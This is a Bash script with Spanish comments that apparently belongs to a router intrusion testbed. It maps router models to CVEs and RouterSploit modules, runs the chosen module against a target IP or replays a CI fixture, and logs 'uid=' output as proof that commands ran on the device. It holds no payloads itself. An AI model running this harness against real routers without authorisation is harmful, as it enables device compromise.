#!/usr/bin/env bash
# routersploit_run.sh — runner RouterSploit por CVE de modelo (T-0202, EP-02).
# --dry-run busca el modelo en scripts/intrusion/cve-models.yaml (awk sobre
# el YAML plano: barato, <5 s por modelo, sin interpreter extra) y emite JSON
# con exploit_id. La ejecución real lanza el módulo contra TARGET y exige
# evidencia de lectura (read_cmd -> "uid=") registrada en intrusion.log.
#
# Exit: 0 éxito; 3 el modelo no tiene CVE (ausencia, no fallo);
#       1 ejecución sin evidencia; 2 error de uso/herramienta.
#
# Uso:
#   routersploit_run.sh --dry-run MODEL=TL-WR841N
#   routersploit_run.sh MODEL=TL-WR841N TARGET=10.70.0.5 [--fixture FILE]
#
# Dobles para CI sin QEMU/RouterSploit:
#   --fixture FILE   usa FILE como salida capturada del módulo (no ejecuta)
#   RSP_CMD="cmd"    plantilla real: se invocan $RSP_CMD <module> <target> <read_cmd>
#   INTRUSION_LOG    ruta del log de evidencia (default ./intrusion.log)
set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
YAML="$ROOT/scripts/intrusion/cve-models.yaml"
MODEL=""
TARGET=""
FIXTURE=""
DRY=0
CMD_OVERRIDE=""
LOG="${INTRUSION_LOG:-$PWD/intrusion.log}"

die() { echo "routersploit_run: $*" >&2; exit 2; }

while [ $# -gt 0 ]; do
  case "$1" in
    --dry-run) DRY=1 ;;
    --yaml) shift; YAML="${1:?}" ;;
    --yaml=*) YAML="${1#*=}" ;;
    --fixture) shift; FIXTURE="${1:?}" ;;
    --fixture=*) FIXTURE="${1#*=}" ;;
    --cmd) shift; CMD_OVERRIDE="${1:?}" ;;
    --cmd=*) CMD_OVERRIDE="${1#*=}" ;;
    --log) shift; LOG="${1:?}" ;;
    --log=*) LOG="${1#*=}" ;;
    --*) die "flag desconocida $1" ;;
    *=*)
      key="${1%%=*}"; val="${1#*=}"
      case "$key" in
        MODEL) MODEL="$val" ;;
        TARGET) TARGET="$val" ;;
        *) die "clave desconocida $key" ;;
      esac ;;
    *) die "argumento desconocido $1" ;;
  esac
  shift
done

[ -f "$YAML" ] || die "YAML de CVEs inexistente: $YAML"
[ -n "$MODEL" ] || die "falta MODEL=<modelo> (ver cve-models.yaml)"

# lookup YAML -> "model<TAB>cve<TAB>exploit_id<TAB>module<TAB>read_cmd" o nada
lookup() {
  awk -v want="$MODEL" '
    function flush() {
      if (have && tolower(model) == tolower(want))
        printf "%s\t%s\t%s\t%s\t%s\n", model, cve, expid, mod, (rcmd != "" ? rcmd : "uid")
    }
    /^[[:space:]]*-[[:space:]]*model:/ { flush(); model=""; cve=""; expid=""; mod=""; rcmd=""; have=0
      sub(/^[[:space:]]*-[[:space:]]*model:[[:space:]]*/, ""); gsub(/"/, ""); model=$0; have=1; next }
    /^[[:space:]]*#/ { next }
    /^[[:space:]]+(cve|exploit_id|module|read_cmd):/ {
      key=$1; sub(/:$/, "", key); sub(/^[[:space:]]*[a-z_]+:[[:space:]]*/, "")
      gsub(/"/, "")
      if (key == "cve") cve=$0
      else if (key == "exploit_id") expid=$0
      else if (key == "module") mod=$0
      else if (key == "read_cmd") rcmd=$0
      next }
    END { flush() }
  ' "$YAML" | head -1
}

ROW="$(lookup)"

if [ "$DRY" = 1 ]; then
  if [ -z "$ROW" ]; then
    printf '{"model":"%s","cve":null,"exploit_id":null}\n' "$MODEL"
    exit 3
  fi
  IFS=$'\t' read -r m c x mod rc <<< "$ROW"
  printf '{"model":"%s","cve":"%s","exploit_id":"%s","module":"%s","dry_run":true}\n' "$m" "$c" "$x" "$mod"
  exit 0
fi

# --- ejecución real (o fixture): canal de explotación + evidencia de lectura.
[ -n "$ROW" ] || { printf '{"model":"%s","cve":null,"exploit_id":null}\n' "$MODEL"; exit 3; }
IFS=$'\t' read -r m c x mod rc <<< "$ROW"
[ -n "$CMD_OVERRIDE" ] && rc="$CMD_OVERRIDE"

if [ -n "$FIXTURE" ]; then
  [ -f "$FIXTURE" ] || die "fixture inexistente: $FIXTURE"
  OUT="$(cat "$FIXTURE")"
  rc_run=0
elif [ -n "${RSP_CMD:-}" ]; then
  OUT="$($RSP_CMD "$mod" "${TARGET:-}" "$rc" 2>&1)"
  rc_run=$?
else
  die "ejecución real requiere RSP_CMD=<plantilla> o --fixture (RouterSploit no instalado)"
fi

if [ "$rc_run" -ne 0 ]; then
  echo "routersploit_run: módulo $mod falló (exit $rc_run)" >&2
  exit 1
fi
if ! printf '%s' "$OUT" | grep -q 'uid='; then
  echo "routersploit_run: sin evidencia de lectura ($rc) en la salida del módulo" >&2
  exit 1
fi

EVID="$(printf '%s\n' "$OUT" | grep 'uid=' | head -1)"
mkdir -p "$(dirname "$LOG")" 2>/dev/null
printf '%s\t%s\t%s\t%s\t%s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$m" "$c" "$x" "$EVID" >> "$LOG"
# el JSON escapa \ y " (rutas Windows en el log romperían JSON sin esto).
json_esc() { sed 's/\\/\\\\/g; s/"/\\"/g' <<< "$1"; }
printf '{"model":"%s","cve":"%s","exploit_id":"%s","evidence":"%s","log":"%s"}\n' \
  "$m" "$c" "$x" "$(json_esc "$EVID")" "$(json_esc "$LOG")"
exit 0
